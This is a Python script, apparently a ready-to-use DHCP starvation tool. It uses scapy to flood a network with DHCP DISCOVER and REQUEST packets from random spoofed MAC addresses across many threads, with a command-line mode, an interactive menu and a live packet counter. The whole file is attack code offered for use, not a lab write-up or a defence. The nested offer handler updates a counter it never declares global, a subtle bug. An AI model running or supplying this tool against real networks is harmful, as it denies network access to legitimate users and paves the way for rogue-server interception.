#!/usr/bin/env python3
# DHCP Starvation Attack Tool with Real-Time Progress (Normal Mode Only)

import argparse
import threading
import random
import signal
import sys
import time
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, sniff, RandMAC, conf
)

RED    = "\033[38;2;255;0;0m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

stopAttack  = False
packetsSent = 0
stdoutLock  = threading.Lock()
timerThread = None
stopTimer   = False

def SignalHandler(sig, frame):
    global stopAttack, stopTimer, timerThread
    print(f"\n{RED}Stopping the attack...{RESET}")
    stopAttack = True
    stopTimer  = True
    if timerThread and timerThread.is_alive():
        timerThread.join()
    sys.exit(0)

def UpdateTimer(startTime):
    while not stopTimer:
        elapsed   = time.time() - startTime
        formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        with stdoutLock:
            sys.stdout.write(f"\rPackets sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{formatted}{RESET}")
            sys.stdout.flush()
        time.sleep(1)

def GenerateMac():
    return str(RandMAC())

def BuildDiscover(mac, xid=None):
    if xid is None:
        xid = random.randint(1, 0xFFFFFFFF)
    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid, flags=0x8000) /
        DHCP(options=[("message-type","discover"), "end"])
    )
    return pkt, xid

def BuildRequest(mac, xid, requestedIp, serverIp):
    return (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid, flags=0x8000) /
        DHCP(options=[
            ("message-type","request"),
            ("requested_addr", requestedIp),
            ("server_id", serverIp),
            "end"
        ])
    )

def NormalWorker(interface, packetsPerThread):
    global packetsSent
    conf.iface = interface
    for _ in range(packetsPerThread):
        if stopAttack:
            break
        mac = GenerateMac()
        discoverPkt, xid = BuildDiscover(mac)
        sendp(discoverPkt, verbose=False)
        packetsSent += 1

        def handleOffer(pkt):
            if BOOTP in pkt and pkt[BOOTP].xid == xid and DHCP in pkt:
                for opt in pkt[DHCP].options:
                    if opt[0]=="message-type" and opt[1]==2:
                        offeredIp = pkt[BOOTP].yiaddr
                        serverIp  = pkt[IP].src
                        req = BuildRequest(mac, xid, offeredIp, serverIp)
                        sendp(req, verbose=False)
                        packetsSent += 1
        sniff(
            filter="udp and (port 67 or 68)",
            prn=handleOffer,
            timeout=1,
            iface=interface,
            stop_filter=lambda x: False
        )

def StartAttack(interface, threadsCount, packetsPerThread):
    global stopTimer, timerThread
    conf.iface = interface
    print(f"{RED}Starting NORMAL DHCP starvation on {interface}{RESET}")

    startTime = time.time()
    stopTimer  = False
    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
    timerThread.start()

    threads = []
    for _ in range(threadsCount):
        t = threading.Thread(target=NormalWorker, args=(interface, packetsPerThread))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    stopTimer = True
    timerThread.join()

    elapsed   = time.time() - startTime
    formatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
    print(f"\n{BOLD}Attack complete.{RESET}")
    print(f"Packets sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{formatted}{RESET}")

def menu():
    interface = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
    threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
    packets   = int(input(f"{RED}Packets per thread [50]: {RESET}") or "50")
    StartAttack(interface, threads, packets)

def terminal():
    parser = argparse.ArgumentParser(description="DHCP Starvation Tool")
    parser.add_argument("-i","--interface", required=True)
    parser.add_argument("-t","--threads", type=int, default=10)
    parser.add_argument("-p","--packets", type=int, default=50)
    args = parser.parse_args()
    StartAttack(args.interface, args.threads, args.packets)

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv)>1:
        terminal()
    else:
        menu()

if __name__=="__main__":
    main()
